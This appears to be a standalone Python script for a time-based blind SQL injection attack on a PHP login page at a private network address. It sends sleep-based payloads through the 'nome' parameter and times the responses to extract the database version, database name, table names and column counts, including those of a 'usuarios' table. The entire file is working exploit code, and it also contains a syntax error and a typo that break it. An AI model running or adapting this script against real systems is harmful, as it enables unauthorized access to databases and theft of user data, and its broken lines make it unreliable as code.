import requests

def sql_injector(data_name, url, sql, word_size=20, columns_number = 1):
	char_list = " .1234567890etaoiunshrdlwmfcgypbkvjxqzETAOINSHRDLUWMFCGYPBKVJXQZ!@#$%*()_-=´`[]{}~^;,<>?/\|'\""
	
	print("Getting",data_name)
	
	found_list = []
	
	for column in range(0, columns_number):
		found = ""
		for i in range(1, word_size):
			change = False
			for char in char_list:
				query = "?nome=\' or IF(MID((%s limit %s,1),1,%s)=\"%s\",sleep(2),1); -- &senha=0" % (sql, str(column), str(i), (found + char))
				try:					
					response = requests.get(url+query, timeout=2)
					
					#print(query)
					
					if response.status_code != requests.codes.ok:
						print("An error ocurred sending", char, ":", response.status.code)
				
				except requests.exceptions.Timeout:
					found += char
					
					# It gives two three strikes (fake sleeps) before killing itself
					change = False if i > len(found.strip()) + 2 else True
					
					# Uncomment to show steps	
					#print("Found:", found)
					break
			
			if not change:
				found_list.append(found.strip())
				break
	
	if len(found_list) == 1) found_list = found_list[0]
	return found_list	
			
def multiple_tables(table_names, data_name, url, sql, word_size=20, columns_number = 1):
	result = {}
	
	for table in table_names:
		result[table] = {}
		result[table]["length"] = int(sql_injector("Columns", url, "%s%s\"" % (sql, table))[0])
		
	return result
	
url = "http://192.168.0.12/recebe.php"

if requests.get(url).status_code != requests.codes.ok:
	print("Error to connect to", url)
	exit()

print("Starting the Sqli Blind at:", url)

# Gets mysql and server's versions
version = sql_injector("Version", url, "SELECT @@version", 30)
print("Version:", version, "\n")

db_name = sql_injector("Database name", url, "SELECT database()")
print("Database name:", db_name, "\n")

table_numb = int(sql_injector("Table Numb", url, "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()")[0])
print("Table Numb:", table_numb, "\n")

table_names = sql_injector("Tables names", url, "SELECT table_name FROM information_schema.tables WHERE table_schema=database()", 20, table_numb)
print("Table names:", table_names, "\n")

tables_column_num = multiple_tables(['test', 'usuarios'], "Columns number", url, "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name=\"")
print(db_name, ":", tables_column_num)
